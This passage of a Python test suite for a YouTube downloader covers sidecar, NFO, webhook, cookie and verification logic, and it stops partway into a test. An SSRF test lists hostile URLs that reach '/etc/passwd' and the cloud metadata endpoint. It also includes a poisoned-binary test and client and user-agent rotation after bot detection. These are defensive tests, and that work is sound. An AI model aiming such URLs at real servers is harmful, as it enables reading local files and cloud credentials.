    assert to_vtt([]) == 'WEBVTT\n\n', repr(to_vtt([]))
    # last chapter with no end -> start+1.0 fallback
    v2 = to_vtt([{'start_time': 5, 'title': 'Solo'}])
    assert '00:00:05.000 --> 00:00:06.000' in v2, v2
    print('test_markers_vtt passed')


def test_write_text_sidecars():
    """write <stem>.description.txt + <stem>.chapters.vtt; skips empties."""
    from Final.markers import write_text_sidecars
    import tempfile, os
    chs = [{'start_time': 0, 'end_time': 90, 'title': 'Intro'}]
    d = tempfile.mkdtemp()
    m = os.path.join(d, 'v.mp4')
    open(m, 'w').close()
    w = {os.path.basename(p) for p in write_text_sidecars(m, 'desc line', chs)}
    assert w == {'v.description.txt', 'v.chapters.vtt'}, w
    vtt = open(os.path.join(d, 'v.chapters.vtt'), encoding='utf-8').read()
    assert vtt.startswith('WEBVTT'), vtt[:20]
    # empty description skips the .txt
    w2 = {os.path.basename(p) for p in write_text_sidecars(m, '', chs)}
    assert w2 == {'v.chapters.vtt'}, w2
    # empty chapters skips the .vtt
    w3 = {os.path.basename(p) for p in write_text_sidecars(m, 'desc', [])}
    assert w3 == {'v.description.txt'}, w3
    print('test_write_text_sidecars passed')


def test_jobspec_sub_format_and_sidecar_text():
    from Final.jobspec import JobSpec
    s = JobSpec.from_dict({'urls': ['u'], 'sub_format': 'both', 'write_sidecar_text': 'true'})
    assert s.sub_format == 'both' and s.write_sidecar_text is True
    # bad value coerces to srt
    assert JobSpec.from_dict({'urls': ['u'], 'sub_format': 'bogus'}).sub_format == 'srt'
    # round-trip
    assert JobSpec.from_dict(s.to_dict()).sub_format == 'both'
    # default
    assert JobSpec().sub_format == 'srt'
    print('test_jobspec_sub_format_and_sidecar_text passed')


def test_spec_download_opts_sub_format():
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    from Final.jobspec import JobSpec
    # vtt -> subtitlesformat vtt/best + convertor format vtt
    ov = dl.get_optimized_ydl_opts('1080p', spec=JobSpec(urls=['u'], sub_langs=['en'], sub_format='vtt'))
    assert ov['subtitlesformat'] == 'vtt/best', ov.get('subtitlesformat')
    assert any(p.get('key') == 'FFmpegSubtitlesConvertor' and p.get('format') == 'vtt'
               for p in ov['postprocessors'])
    # srt (legacy default) regression guard -> srt/best + convertor format srt
    os_ = dl.get_optimized_ydl_opts('1080p', spec=JobSpec(urls=['u'], sub_langs=['en'], sub_format='srt'))
    assert os_['subtitlesformat'] == 'srt/best', os_.get('subtitlesformat')
    assert any(p.get('key') == 'FFmpegSubtitlesConvertor' and p.get('format') == 'srt'
               for p in os_['postprocessors'])
    # both -> keep native vtt with NO deleting convertor; the engine derives a sibling .srt post-download
    ob = dl.get_optimized_ydl_opts('1080p', spec=JobSpec(urls=['u'], sub_langs=['en'], sub_format='both'))
    assert ob['subtitlesformat'] == 'vtt/best', ob.get('subtitlesformat')
    assert not any(p.get('key') == 'FFmpegSubtitlesConvertor' for p in ob['postprocessors']), \
        'both must NOT run the subtitle convertor (it deletes the native vtt, leaving only srt)'
    print('test_spec_download_opts_sub_format passed')


def test_nfo_export():
    from Final.nfo import to_nfo, write_nfo
    info = {'title': 'Cool <Video>', 'uploader': 'Chan & Co', 'upload_date': '20251231',
            'duration': 900, 'description': 'line1\nline2', 'id': 'abc123',
            'categories': ['Music'], 'tags': ['a', 'b'], 'thumbnail': 'http://x/t.jpg',
            'webpage_url': 'http://y'}
    xml = to_nfo(info)
    assert xml.startswith('<?xml') and '<movie>' in xml
    assert '<title>Cool &lt;Video&gt;</title>' in xml          # XML-escaped
    assert '<premiered>2025-12-31</premiered>' in xml and '<year>2025</year>' in xml
    assert '<runtime>15</runtime>' in xml                       # 900s -> 15 min
    assert '<studio>Chan &amp; Co</studio>' in xml
    assert 'type="youtube"' in xml and '>abc123<' in xml
    import tempfile, os
    m = os.path.join(tempfile.mkdtemp(), 'v.mp4')
    open(m, 'w').close()
    p = write_nfo(m, info)
    assert os.path.basename(str(p)) == 'v.nfo'
    assert write_nfo(m, {}) is None                            # no title -> no nfo
    print('test_nfo_export passed')


def test_watch_feed_parse_and_resolve():
    from Final.watch import parse_feed, resolve_channel_id, feed_url
    cid = 'UCXuqSBlHAE6Xw-yeJA0Tunw'
    assert resolve_channel_id(cid) == cid                                   # bare id
    assert resolve_channel_id(f'https://www.youtube.com/channel/{cid}') == cid
    assert resolve_channel_id(f'https://www.youtube.com/feeds/videos.xml?channel_id={cid}') == cid
    assert f'channel_id={cid}' in feed_url(cid)
    xml = ('<?xml version="1.0"?><feed xmlns="http://www.w3.org/2005/Atom" '
           'xmlns:yt="http://www.youtube.com/xml/schemas/2015"><entry>'
           '<yt:videoId>abc12345678</yt:videoId><title>Hello &amp; Bye</title>'
           '<published>2026-01-01T00:00:00+00:00</published></entry></feed>')
    vids = parse_feed(xml)
    assert len(vids) == 1 and vids[0]['id'] == 'abc12345678' and vids[0]['title'] == 'Hello & Bye'
    assert vids[0]['url'].endswith('watch?v=abc12345678')
    assert parse_feed('not xml') == []
    print('test_watch_feed_parse_and_resolve passed')


def test_watch_match_filters():
    from Final.watch import match_filters, _published_yyyymmdd
    # _published_yyyymmdd
    assert _published_yyyymmdd('2026-01-01T00:00:00+00:00') == '20260101'
    assert _published_yyyymmdd(None) is None and _published_yyyymmdd('2026-01') is None
    v = {'title': 'My Cool Video', 'published': '2026-01-01T00:00:00+00:00'}
    # empty filters -> always pass
    assert match_filters(v, {}) is True
    assert match_filters(v, None) is True
    # title regex (case-insensitive)
    assert match_filters(v, {'filter_title': 'cool'}) is True
    assert match_filters(v, {'filter_title': 'NOPE'}) is False
    # invalid regex -> reject (no crash)
    assert match_filters(v, {'filter_title': '['}) is False
    # after
    assert match_filters(v, {'after': '20251231'}) is True
    assert match_filters(v, {'after': '20260101'}) is True   # on/after, inclusive
    assert match_filters(v, {'after': '20260102'}) is False
    # unknown published + after set -> reject
    assert match_filters({'title': 'x'}, {'after': '20260101'}) is False
    # duration bounds
    assert match_filters(v, {'min_duration': 60}, duration=120) is True
    assert match_filters(v, {'min_duration': 200}, duration=120) is False
    assert match_filters(v, {'max_duration': 200}, duration=120) is True
    assert match_filters(v, {'max_duration': 60}, duration=120) is False
    assert match_filters(v, {'min_duration': 60, 'max_duration': 200}, duration=120) is True
    # duration bound set but duration unknown -> reject
    assert match_filters(v, {'min_duration': 60}, duration=None) is False
    # no duration filter -> duration ignored entirely
    assert match_filters(v, {'filter_title': 'cool'}, duration=None) is True
    print('test_watch_match_filters passed')


def test_watchstore_filters_roundtrip():
    import tempfile, os
    from Final.watchstore import WatchStore
    p = os.path.join(tempfile.mkdtemp(), 'watches.json')
    try:
        st = WatchStore(path=p)
        flt = {'filter_title': 'news', 'after': '20260101', 'min_duration': 60, 'max_duration': 600}
        w = st.add('UC' + 'a' * 22, filters=flt)
        got = st.get(w['id'])
        assert got['filters'] == flt
        # a watch added WITHOUT filters has filters == {} (back-compat)
        w2 = st.add('UC' + 'b' * 22)
        assert st.get(w2['id']).get('filters', {}) == {}
        print('test_watchstore_filters_roundtrip passed')
    finally:
        try: os.unlink(p)
        except OSError: pass


def test_watchstore_defaults_full_jobspec():
    import tempfile, os
    from Final.watchstore import WatchStore
    from Final.jobspec import JobSpec
    p = os.path.join(tempfile.mkdtemp(), 'watches.json')
    try:
        st = WatchStore(path=p)
        defaults = {'profile': 'premiere_prores_lt', 'loudnorm': -14.0, 'write_nfo': True,
                    'export_markers': 'all', 'organize_by': 'uploader', 'no_shorts': True}
        w = st.add('UC' + 'c' * 22, defaults=defaults)
        got = st.get(w['id'])['defaults']
        for k, val in defaults.items():
            assert got[k] == val, f'{k}: {got.get(k)} != {val}'
        # mirror _enqueue_from_watch: JobSpec.from_dict on the persisted defaults + urls
        spec = JobSpec.from_dict({**got, 'urls': ['u']})
        assert spec.loudnorm == -14.0 and spec.write_nfo is True
        assert spec.export_markers == 'all' and spec.organize_by == 'uploader'
        assert spec.profile == 'premiere_prores_lt'
        # legacy 3-key defaults dict still builds a valid spec (regression guard)
        legacy = JobSpec.from_dict({'quality': '1080p', 'encode_mode': 'copy', 'no_shorts': True,
                                    'urls': ['u']})
        assert legacy.urls == ['u']
        print('test_watchstore_defaults_full_jobspec passed')
    finally:
        try: os.unlink(p)
        except OSError: pass


def test_jobspec_nextgen_fields():
    from Final.jobspec import JobSpec
    s = JobSpec.from_dict({'urls': ['u'], 'write_nfo': '1', 'proxy_pair': True, 'notify_url': 'http://h/x'})
    assert s.write_nfo is True and s.proxy_pair is True and s.notify_url == 'http://h/x'
    assert JobSpec.from_dict(s.to_dict()).notify_url == 'http://h/x'
    print('test_jobspec_nextgen_fields passed')


def test_nfo_kind_auto_and_episode():
    from Final.nfo import to_nfo
    ep_info = {'title': 'Ep', 'playlist': 'My Series', 'playlist_index': 3, 'id': 'x',
               'upload_date': '20251231'}
    xml = to_nfo(ep_info)                                       # auto -> episode (has playlist)
    assert '<episodedetails>' in xml
    assert '<showtitle>My Series</showtitle>' in xml
    assert '<season>1</season>' in xml and '<episode>3</episode>' in xml

    solo = {'title': 'Solo', 'id': 'y'}
    solo_xml = to_nfo(solo)                                     # auto -> movie (no playlist)
    assert '<movie>' in solo_xml and '<episodedetails>' not in solo_xml

    # force movie on a playlist video
    forced_movie = to_nfo(ep_info, kind='movie')
    assert '<movie>' in forced_movie and '<episodedetails>' not in forced_movie
    # force episode on a solo video -> no <episode> tag (no playlist_index to fabricate)
    forced_ep = to_nfo(solo, kind='episode')
    assert '<episodedetails>' in forced_ep and '<episode>' not in forced_ep

    # REGRESSION: auto on a solo video must stay byte-identical to the legacy <movie> output.
    legacy_info = {'title': 'Cool', 'uploader': 'Chan', 'upload_date': '20251231', 'id': 'abc'}
    assert to_nfo(legacy_info, kind='auto') == to_nfo(legacy_info, kind='movie')
    print('test_nfo_kind_auto_and_episode passed')


def test_tvshow_nfo_export():
    from Final.nfo import to_tvshow_nfo, write_tvshow_nfo
    info = {'playlist': 'My Series', 'playlist_id': 'PL123', 'uploader': 'Chan'}
    xml = to_tvshow_nfo(info)
    assert '<tvshow>' in xml and '<showtitle>My Series</showtitle>' in xml
    assert 'type="youtube"' in xml and '>PL123<' in xml
    import tempfile, os
    d = tempfile.mkdtemp()
    p = write_tvshow_nfo(d, info)
    assert os.path.basename(str(p)) == 'tvshow.nfo' and os.path.exists(str(p))
    assert to_tvshow_nfo({}) is None                            # no show title -> None
    assert write_tvshow_nfo(d, {}) is None
    print('test_tvshow_nfo_export passed')


def test_jobspec_nfo_artwork_fields():
    from Final.jobspec import JobSpec
    s = JobSpec.from_dict({'urls': ['u'], 'nfo_kind': 'episode', 'write_artwork': '1'})
    assert s.nfo_kind == 'episode' and s.write_artwork is True
    bad = JobSpec.from_dict({'urls': ['u'], 'nfo_kind': 'bogus'})
    assert bad.nfo_kind == 'auto'                               # clamp invalid -> auto
    rt = JobSpec.from_dict(s.to_dict())
    assert rt.nfo_kind == 'episode' and rt.write_artwork is True
    print('test_jobspec_nfo_artwork_fields passed')


def test_write_artwork_from_jpg():
    from Final.yt_final import FinalYouTubeGPUEngine
    import tempfile, os
    d = tempfile.mkdtemp()
    media = os.path.join(d, 'v.mp4')
    open(media, 'w').close()
    # sibling jpg thumbnail -> exercises the copy branch only (no ffmpeg needed in CI)
    thumb = os.path.join(d, 'v.jpg')
    with open(thumb, 'wb') as f:
        f.write(b'\xff\xd8\xff\xe0jpegbytes')
    eng = FinalYouTubeGPUEngine(output_dir=d)
    from pathlib import Path
    written = eng._write_artwork(Path(media), Path(media), {'title': 'v'})
    for name in ('v-poster.jpg', 'v-fanart.jpg', 'folder.jpg'):
        p = os.path.join(d, name)
        assert os.path.exists(p) and os.path.getsize(p) > 0, name
    assert len(written) == 3
    print('test_write_artwork_from_jpg passed')


def test_bot_message_keeps_cookies():
    """HIGH fix: the REAL bot message contains '--cookies'; must NOT strip cookies (rotate client),
    and must not mutate the original http_headers dict."""
    from Final.yt_final import FinalYouTubeGPUEngine
    dl = FinalYouTubeGPUEngine(output_dir='.').downloader
    msg = "Sign in to confirm you're not a bot. Use --cookies-from-browser or --cookies for the authentication"
    opts = {'format': 'best', 'extractor_args': {'youtube': {'player_client': ['android_vr']}},
            'http_headers': {'User-Agent': 'ORIG-UA'}}
    new = dl._next_opts_on_error(msg, 0, opts, cookies_loaded=True, cookiefile=None)
    assert new is not None
    assert 'cookiesfrombrowser' not in new or new.get('cookiesfrombrowser')   # not stripped
    clients = new.get('extractor_args', {}).get('youtube', {}).get('player_client', [])
    assert 'web_embedded' in clients or 'tv_embedded' in clients               # rotated
    assert opts['http_headers']['User-Agent'] == 'ORIG-UA'                     # original NOT mutated (deep copy)
    assert new['http_headers']['User-Agent'] != 'ORIG-UA'                      # new got a fresh UA
    print('test_bot_message_keeps_cookies passed')


def test_encode_to_preserves_original_on_failure():
    """CRITICAL fix: a same-container encode failure must RESTORE the raw download, never delete it."""
    from Final.yt_final import FinalYouTubeGPUEngine
    import tempfile, os
    from pathlib import Path
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = Path(tempfile.mkdtemp()) / 'video.mp4'
    src.write_text('ORIGINAL DATA')
    # encode that leaves a partial output then fails (the exact path that used to delete the original)
    eng._do_encode = lambda s, dst, mode, profile, plan: (Path(dst).write_text('PARTIAL'), False)[1]
    out = eng._encode_to(src, src, 'copy', 'copy_fast', {})
    assert src.exists(), 'CRITICAL REGRESSION: original download was deleted'
    assert src.read_text() == 'ORIGINAL DATA', 'original was replaced by the partial encode'
    print('test_encode_to_preserves_original_on_failure passed')


def test_fire_webhook_rejects_ssrf():
    """HIGH fix: _fire_webhook must reject file://, loopback, link-local, private, localhost (no opener built)."""
    from Final.yt_final import FinalYouTubeGPUEngine
    import urllib.request
    orig = urllib.request.build_opener
    urllib.request.build_opener = lambda *a, **k: (_ for _ in ()).throw(AssertionError('opener built for blocked URL'))
    try:
        for bad in ['file:///etc/passwd', 'http://127.0.0.1:8765/', 'http://169.254.169.254/latest/meta-data/',
                    'http://10.0.0.1/', 'http://localhost/', 'ftp://x/y']:
            ok, err = FinalYouTubeGPUEngine._fire_webhook(bad, {'x': 1})
            assert ok is False and err
    finally:
        urllib.request.build_opener = orig
    print('test_fire_webhook_rejects_ssrf passed')


def test_notify_template_builds_bodies():
    """Each template builds the right body/headers; no network."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    import json
    payload = {'ok': True, 'status': 'ok', 'title': 'My Vid',
               'output': '/out/My Vid.mp4', 'elapsed': 12.3, 'error': '', 'count': 1,
               'files': ['/out/My Vid.mp4'], 'urls': ['https://x/y']}
    # discord -> {"content": ...}
    body, hdr = E._build_notify_request('discord', payload)
    d = json.loads(body); assert 'content' in d and 'My Vid' in d['content']
    assert hdr['Content-Type'] == 'application/json'
    # slack -> {"text": ...}
    body, hdr = E._build_notify_request('slack', payload)
    s = json.loads(body); assert 'text' in s and 'My Vid' in s['text']
    # ntfy -> plain body + Title header
    body, hdr = E._build_notify_request('ntfy', payload)
    assert body == body.decode('utf-8').encode('utf-8')  # bytes
    assert hdr['Title'] == 'My Vid' and hdr['Content-Type'].startswith('text/plain')
    assert b'{' not in body[:1]  # not JSON
    # raw -> generic json passthrough (back-compat)
    body, hdr = E._build_notify_request('raw', payload)
    r = json.loads(body); assert r.get('event') == 'job_complete' or r['ok'] is True
    assert hdr['Content-Type'] == 'application/json'
    print('test_notify_template_builds_bodies passed')


def test_notify_template_jobspec_roundtrip():
    from Final.jobspec import JobSpec
    s = JobSpec.from_dict({'urls': ['u'], 'notify_url': 'http://h/x', 'notify_template': 'discord'})
    assert s.notify_template == 'discord'
    assert JobSpec.from_dict(s.to_dict()).notify_template == 'discord'
    # default + bad value clamp to 'raw'
    assert JobSpec.from_dict({'urls': ['u']}).notify_template == 'raw'
    assert JobSpec.from_dict({'urls': ['u'], 'notify_template': 'bogus'}).notify_template == 'raw'
    print('test_notify_template_jobspec_roundtrip passed')


def test_markers_newline_title():
    """HIGH fix: a chapter title with embedded newlines must not split the single-line EDL * LOC: record."""
    from Final.markers import to_edl
    edl = to_edl([{'start_time': 0, 'end_time': 5, 'title': 'Line1\nLine2\r\nLine3'}], 25, 'T')
    loc = [ln for ln in edl.splitlines() if ln.startswith('* LOC:')]
    assert len(loc) == 1 and 'Line1 Line2 Line3' in loc[0]
    print('test_markers_newline_title passed')


def test_recover_orphaned_running():
    """HIGH fix: jobs stuck 'running' after a crash get recovered (re-queued under cap, failed over cap)."""
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os
    j = DownloadJournal(os.path.join(tempfile.mkdtemp(), 'q.json'))
    r = j.add(JobSpec(urls=['u']))
    j.set_status(r['id'], 'running')
    assert j.recover_orphaned_running() == 1
    assert j.get(r['id'])['status'] == 'queued'              # under cap -> requeued
    j.set_status(r['id'], 'running'); j.update(r['id'], attempt_count=9)
    j.recover_orphaned_running()
    assert j.get(r['id'])['status'] == 'failed'              # over cap -> failed
    print('test_recover_orphaned_running passed')


def test_cookie_discovery_precedence():
    """cookies.txt auto-discovery honors precedence: env > cwd > output-dir > config dir."""
    from Final.yt_final import _discover_cookiefile
    import tempfile, os

    def _same(a, b):
        return os.path.normcase(os.path.realpath(a)) == os.path.normcase(os.path.realpath(b))

    saved_cookies = os.environ.get('YT_FINAL_COOKIES')
    saved_home = os.environ.get('YT_FINAL_HOME')
    saved_cwd = os.getcwd()
    tmp = tempfile.mkdtemp()
    try:
        env_dir = os.path.join(tmp, 'env'); os.makedirs(env_dir)
        cwd_dir = os.path.join(tmp, 'cwd'); os.makedirs(cwd_dir)
        out_dir = os.path.join(tmp, 'out'); os.makedirs(out_dir)
        cfg_dir = os.path.join(tmp, 'cfg'); os.makedirs(cfg_dir)
        env_file = os.path.join(env_dir, 'mycookies.txt')
        for p in (env_file, os.path.join(cwd_dir, 'cookies.txt'),
                  os.path.join(out_dir, 'cookies.txt'), os.path.join(cfg_dir, 'cookies.txt')):
            with open(p, 'w') as f:
                f.write('# cookies\n')
        # config dir is always pinned to a temp dir so the real ~/.yt_final never leaks in
        os.environ['YT_FINAL_HOME'] = cfg_dir

        # 1. env beats all
        os.environ['YT_FINAL_COOKIES'] = env_file
        os.chdir(cwd_dir)
        assert _same(_discover_cookiefile(output_dir=out_dir), env_file)

        # 2. cwd beats output-dir + config
        os.environ.pop('YT_FINAL_COOKIES', None)
        os.chdir(cwd_dir)
        assert _same(_discover_cookiefile(output_dir=out_dir), os.path.join(cwd_dir, 'cookies.txt'))

        # 3. output-dir beats config (cwd has none)
        empty_cwd = os.path.join(tmp, 'empty'); os.makedirs(empty_cwd)
        os.chdir(empty_cwd)
        assert _same(_discover_cookiefile(output_dir=out_dir), os.path.join(out_dir, 'cookies.txt'))

        # 4. config dir used last (no env, cwd empty, no output-dir)
        os.chdir(empty_cwd)
        assert _same(_discover_cookiefile(output_dir=None), os.path.join(cfg_dir, 'cookies.txt'))
    finally:
        os.chdir(saved_cwd)
        if saved_cookies is None:
            os.environ.pop('YT_FINAL_COOKIES', None)
        else:
            os.environ['YT_FINAL_COOKIES'] = saved_cookies
        if saved_home is None:
            os.environ.pop('YT_FINAL_HOME', None)
        else:
            os.environ['YT_FINAL_HOME'] = saved_home
    print('test_cookie_discovery_precedence passed')


def test_cookie_discovery_none():
    """No cookies.txt anywhere -> _discover_cookiefile returns None (hermetic: temp dirs only)."""
    from Final.yt_final import _discover_cookiefile
    import tempfile, os
    saved_cookies = os.environ.get('YT_FINAL_COOKIES')
    saved_home = os.environ.get('YT_FINAL_HOME')
    saved_cwd = os.getcwd()
    tmp = tempfile.mkdtemp()
    try:
        cwd_dir = os.path.join(tmp, 'cwd'); os.makedirs(cwd_dir)
        out_dir = os.path.join(tmp, 'out'); os.makedirs(out_dir)
        cfg_dir = os.path.join(tmp, 'cfg'); os.makedirs(cfg_dir)
        os.environ.pop('YT_FINAL_COOKIES', None)
        os.environ['YT_FINAL_HOME'] = cfg_dir   # empty temp dir, never the real home
        os.chdir(cwd_dir)
        assert _discover_cookiefile(output_dir=out_dir) is None
    finally:
        os.chdir(saved_cwd)
        if saved_cookies is None:
            os.environ.pop('YT_FINAL_COOKIES', None)
        else:
            os.environ['YT_FINAL_COOKIES'] = saved_cookies
        if saved_home is None:
            os.environ.pop('YT_FINAL_HOME', None)
        else:
            os.environ['YT_FINAL_HOME'] = saved_home
    print('test_cookie_discovery_none passed')


def test_verify_strict_jobspec_field():
    from Final.jobspec import JobSpec
    assert JobSpec().verify_strict is False
    assert JobSpec.from_dict({'verify_strict': True}).verify_strict is True
    assert JobSpec.from_dict({'verify_strict': 'yes'}).verify_strict is True
    # round-trip
    s = JobSpec.from_dict({'urls': ['u'], 'verify_strict': '1'})
    assert JobSpec.from_dict(s.to_dict()).verify_strict is True
    # from_args (fake Namespace)
    ns = type('NS', (), {'urls': ['u'], 'verify_strict': True})()
    assert JobSpec.from_args(ns).verify_strict is True
    print('test_verify_strict_jobspec_field passed')


def test_probe_integrity_parses(monkeypatch, tmp_path):
    import Final.yt_final as Y
    ffmpeg = tmp_path / 'tools' / 'ffmpeg.exe'
    ffprobe = ffmpeg.with_name('ffprobe.exe')
    ffmpeg.parent.mkdir()
    ffmpeg.write_bytes(b'ffmpeg')
    ffprobe.write_bytes(b'ffprobe')
    output = tmp_path / 'out.mp4'
    output.write_bytes(b'x' * 4096)
    detector = type(
        'Detector',
        (),
        {
            'ffmpeg_path': str(ffmpeg),
            'gpu_info': {
                'working_encoders': [],
                'available_encoders': set(),
            },
        },
    )()
    proc = Y.FFmpegProcessor(detector)
    fixture = ('{"streams":[{"codec_type":"video"},{"codec_type":"audio"}],'
               '"format":{"duration":"123.45"}}')

    class _R:
        stdout = fixture
        returncode = 0

    commands = []
    monkeypatch.setattr(
        Y.subprocess,
        'run',
        lambda command, **_kwargs: commands.append(list(command)) or _R(),
    )

    d = proc.probe_integrity(output)

    assert commands and commands[0][0] == str(ffprobe)
    assert d['has_video'] is True and d['has_audio'] is True
    assert abs(d['duration'] - 123.45) < 0.001
    assert d['size'] == 4096
    print('test_probe_integrity_parses passed')


def test_ffprobe_never_falls_back_to_poisoned_working_directory(
        monkeypatch, tmp_path):
    import Final.yt_final as Y

    poisoned = tmp_path / 'download-folder'
    poisoned.mkdir()
    (poisoned / 'ffprobe.exe').write_bytes(b'poison')
    monkeypatch.chdir(poisoned)
    detector = type(
        'Detector',
        (),
        {
            'ffmpeg_path': 'custom-ffmpeg',
            'gpu_info': {'working_encoders': [], 'available_encoders': set()},
        },
    )()
    processor = Y.FFmpegProcessor(detector)
    executed = []

    def forbidden_run(command, **_kwargs):
        executed.append(list(command))
        return type('Completed', (), {'returncode': 0, 'stdout': '{}'})()

    monkeypatch.setattr(Y.subprocess, 'run', forbidden_run)

    assert processor.ffprobe is None
    assert processor.probe_integrity(tmp_path / 'video.mp4') == {}
    assert executed == []


def test_verify_output_passes_good():
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    from pathlib import Path as P
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = P('vid.mp4')
    eng.processor.probe_integrity = lambda s: {'duration': 100.0, 'has_video': True, 'has_audio': True, 'size': 5_000_000}
    eng.downloader.last_info[str(src)] = {'duration': 100}
    assert eng._verify_output(P('vid.mp4'), src, JobSpec(urls=['u'], verify_strict=True)) == (True, None)
    print('test_verify_output_passes_good passed')


def test_verify_output_fails_short_duration_strict():
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec, VerificationError
    from pathlib import Path as P
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = P('vid.mp4')
    eng.processor.probe_integrity = lambda s: {'duration': 10.0, 'has_video': True, 'has_audio': True, 'size': 5_000_000}
    eng.downloader.last_info[str(src)] = {'duration': 100}
    ok, reason = eng._verify_output(P('vid.mp4'), src, JobSpec(urls=['u'], verify_strict=True))
    assert ok is False and reason and 'duration' in reason
    # strict path raises VerificationError
    spec = JobSpec(urls=['u'], verify_strict=True)
    raised = False
    try:
        raise VerificationError('boom') if not ok else None
    except VerificationError:
        raised = True
    assert raised
    print('test_verify_output_fails_short_duration_strict passed')


def test_verify_output_fails_missing_audio():
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    from pathlib import Path as P
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = P('vid.mp4')
    eng.processor.probe_integrity = lambda s: {'duration': 100.0, 'has_video': True, 'has_audio': False, 'size': 5_000_000}
    eng.downloader.last_info[str(src)] = {'duration': 100}
    ok, reason = eng._verify_output(P('vid.mp4'), src, JobSpec(urls=['u']))
    assert ok is False and 'audio' in reason
    print('test_verify_output_fails_missing_audio passed')


def test_verify_output_strict_fails_when_probe_unavailable():
    """ffprobe missing/failed -> probe_integrity returns {}. Under --verify-strict that must FAIL
    closed (the strict contract promises the output was checked), while non-strict still degrades
    gracefully to OK-with-warning."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    from pathlib import Path as P
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = P('vid.mp4')
    eng.processor.probe_integrity = lambda s: {}          # probe unavailable / failed
    eng.downloader.last_info[str(src)] = {'duration': 100}
    # strict: an un-run verification is a failure, NOT a silent pass
    ok, reason = eng._verify_output(P('vid.mp4'), src, JobSpec(urls=['u'], verify_strict=True))
    assert ok is False and reason
    # non-strict: graceful skip (warn + continue) is preserved
    ok2, reason2 = eng._verify_output(P('vid.mp4'), src, JobSpec(urls=['u']))
    assert ok2 is True and reason2 is None
    print('test_verify_output_strict_fails_when_probe_unavailable passed')


def test_verify_nonstrict_only_warns():
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    from pathlib import Path as P
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = P('vid.mp4')
    # bad probe but NOT strict -> _verify_output reports failure, but caller must not raise.
    eng.processor.probe_integrity = lambda s: {'duration': 10.0, 'has_video': True, 'has_audio': True, 'size': 5_000_000}
    eng.downloader.last_info[str(src)] = {'duration': 100}
    spec = JobSpec(urls=['u'], verify_strict=False)
    ok, reason = eng._verify_output(P('vid.mp4'), src, spec)
    assert ok is False
    # mirror the _finalize tail logic for non-strict: no raise
    if not ok and spec.verify_strict:
        raise AssertionError('should not be strict')
    print('test_verify_nonstrict_only_warns passed')


def test_verify_skips_unknown_duration():
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    from pathlib import Path as P
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = P('vid.mp4')
    eng.processor.probe_integrity = lambda s: {'duration': 5.0, 'has_video': True, 'has_audio': True, 'size': 5_000_000}
    eng.downloader.last_info[str(src)] = {}  # no 'duration'
    assert eng._verify_output(P('vid.mp4'), src, JobSpec(urls=['u'], verify_strict=True)) == (True, None)
    print('test_verify_skips_unknown_duration passed')


def test_verify_audio_only_allows_no_video():
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    from pathlib import Path as P
    eng = FinalYouTubeGPUEngine(output_dir='.')
    src = P('song.m4a')
    eng.processor.probe_integrity = lambda s: {'duration': 100.0, 'has_video': False, 'has_audio': True, 'size': 5_000_000}
    eng.downloader.last_info[str(src)] = {'duration': 100}
    assert eng._verify_output(P('song.m4a'), src, JobSpec(urls=['u'], quality='audio')) == (True, None)
    print('test_verify_audio_only_allows_no_video passed')


def test_format_id_overrides_selection():
    """--format-id (JobSpec.format_id) replaces opts['format'] via _apply_spec_download_opts, and
    round-trips through JobSpec; the default (no format_id) path leaves format untouched."""
    from Final.jobspec import JobSpec
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    o = {'format': 'X'}
    dl._apply_spec_download_opts(o, [], JobSpec(urls=['u'], format_id='137+140'), section=None)
    assert o['format'] == '137+140'
    # no format_id -> format untouched
    o2 = {'format': 'X'}
    dl._apply_spec_download_opts(o2, [], JobSpec(urls=['u']), section=None)
    assert o2['format'] == 'X'
    # JobSpec round-trip + from_args carry format_id
    s = JobSpec.from_dict({'urls': ['u'], 'format_id': '22'})
    assert JobSpec.from_dict(s.to_dict()).format_id == '22'
    ns = type('NS', (), {'urls': ['u'], 'format_id': '299+140'})()
    assert JobSpec.from_args(ns).format_id == '299+140'
    print('test_format_id_overrides_selection passed')


def test_list_formats_json_rows():
    """_format_rows curates a synthetic info dict; filesize falls back to filesize_approx; the
    single-id filter selects/raises appropriately (no network)."""
    info = {'id': 'abc', 'title': 'T', 'formats': [
        {'format_id': '137', 'ext': 'mp4', 'vcodec': 'avc1', 'acodec': 'none',
         'height': 1080, 'width': 1920, 'fps': 30, 'tbr': 4000, 'filesize_approx': 12345,
         'format_note': '1080p', 'protocol': 'https', 'resolution': '1920x1080'},
        {'format_id': '140', 'ext': 'm4a', 'vcodec': 'none', 'acodec': 'mp4a',
         'height': None, 'filesize': 999, 'protocol': 'https'},
    ]}
    rows = YouTubeDownloader._format_rows(info)
    assert len(rows) == 2
    for key in ('format_id', 'ext', 'vcodec', 'acodec', 'height', 'width', 'fps',
                'tbr', 'filesize', 'format_note', 'protocol', 'resolution'):
        assert key in rows[0], key
    # filesize fallback to filesize_approx
    assert rows[0]['filesize'] == 12345
    assert rows[1]['filesize'] == 999
    # single-id filter
    sel = [r for r in rows if str(r.get('format_id')) == '140']
    assert len(sel) == 1 and sel[0]['acodec'] == 'mp4a'
    missing = [r for r in rows if str(r.get('format_id')) == 'nope']
    assert missing == []
    # empty info is safe
    assert YouTubeDownloader._format_rows({}) == []
    print('test_list_formats_json_rows passed')


def test_simulate_plan_resolves():
    """engine.simulate() resolves the plan via a monkeypatched extract_info, reports a .mov container
    for a ProRes re-encode, lists expected sidecars, returns ok=True, and downloads NOTHING."""
    import Final.yt_final as Y
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
